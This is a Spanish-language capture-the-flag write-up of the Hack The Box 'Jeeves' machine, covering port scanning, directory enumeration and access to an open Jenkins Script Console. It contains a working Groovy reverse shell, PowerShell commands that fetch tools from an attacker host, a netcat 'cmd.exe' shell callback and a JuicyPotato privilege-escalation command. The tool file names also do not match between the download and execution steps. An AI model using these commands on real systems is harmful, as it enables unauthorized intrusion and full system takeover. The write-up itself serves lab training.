---
title: "Jeeves"
description: "Guia completa paso a paso de como resolver la maquina Jeeves de Hack The Box"
date: 2026-01-04
creator: "HTB"
rating: 4.3 
dificultad: "Medio"
author: "Ghxstsec"
draft: false
type: "post"
---

![AskJeeves](/images/writeups/jeeves/jeeves.png)


Como siempre, comenzamos con la enumeracion:

```
nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 10.129.10.37
```

```
# Nmap 7.95 scan initiated Thu Mar 26 16:02:29 2026 as: nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 10.129.10.37
Nmap scan report for 10.129.10.37
Host is up (0.044s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-26T20:03:07
|_  start_date: 2026-03-26T20:01:01

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 26 16:03:43 2026 -- 1 IP address (1 host up) scanned in 73.93 seconds
```

Podemos ver un HTTP, un SMB y un 50000, que es un jetty, normalmente para cosas de jenkins, para ahorraros tiempo, el SMB no tenia nada interesante, asi que vamos a la web:

![AskJeeves](/images/writeups/jeeves/1.png)

```
gobuster dir -u http://10.129.10.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

No saca nada interesante, asi que vamos con el puerto 50000

![AskJeeves](/images/writeups/jeeves/2.png)

No encuentra nada en un principio, asi que vamos a enumerar otra vez los subdirectorios:

```
gobuster dir -u http://10.129.10.37:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![AskJeeves](/images/writeups/jeeves/3.webp)

Podemos ver askjeeves, vamos a ver que guarda esa pagina:

# Shell como "Kohsuke"

![AskJeeves](/images/writeups/jeeves/4.webp)

En mi caso usare la reverse shell a traves de Manage Jenkins/Script Console, este es el codigo que usare:

```
Thread.start {
String host="ip atacante";
int port=<puerto para recibir la shell>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

![AskJeeves](/images/writeups/jeeves/5.webp)

Una vez dentro como kohsuke, vamos a sacar la escalada de privilegios:

![AskJeeves](/images/writeups/jeeves/6.webp)

Podemos ver el privilegio SeImpersonate habilitado, es potencialmente vulnerable a Juicy Potato, asi que nos subiremos los archivos necesarios para la explotacion:

```
Estando en el directorio Downloads:

powershell -c Invoke-WebRequest "http://<ip de tu maquina>/PetitPotato.exe" -OutFile "PetitPotato.exe"
powershell -c Invoke-WebRequest "http://<ip de tu maquina>/nc.exe" -OutFile "nc.exe" 
powershell -c Invoke-WebRequest "http://<ip de tu maquina>/rshell.bat" -OutFile "rshell.bat"
```

el nc64.exe lo podemos sacar de aqui:

<a href="https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe">
  <img src="https://img.shields.io/badge/Descargar-nc64.exe-blue?style=for-the-badge&logo=github" alt="Descargar">
</a>

y rshell.bat sera esto:

```
C:\Users\kohsuke\Downloads\nc64.exe -e cmd.exe <ip de tu maquina> 8088
```

y ejecutamos el JuicyPotato de esta manera:

```
.\JuicyPotato.exe -p .\rshell.bat -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -l 8088 -t *
```

Y tendremos la shell como Administrador:

![AskJeeves](/images/writeups/jeeves/7.webp)

asi que vamos a por la flag root.txt:

![AskJeeves](/images/writeups/jeeves/8.webp)

Como? no esta? a simple vista no nos aparecera la tipica flag “root.txt”, eso es porque en Windows puedes unir distintos flujos de datos en un archivo

![AskJeeves](/images/writeups/jeeves/9.webp)

asi que lo leeremos con el siguiente comando:

```
more < hm.txt:root.txt:$DATA
```

![AskJeeves](/images/writeups/jeeves/10.webp)

Hasta ahi esta maquina, gracias por ver :p


-----


👋 Sobre el autor

¡Hola! Soy Ghxstsec, un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.

Actualmente, poseo las certificaciones eJPTv2, eCPPTv3 y Google Cybersecurity Professional Certificate. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.

✉️ Conéctate conmigo:

LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
GitHub: [GitHub](https://github.com/Ghxstsec)
Twitter/X: [Twitter](https://x.com/Louikizz)
Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)

¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊

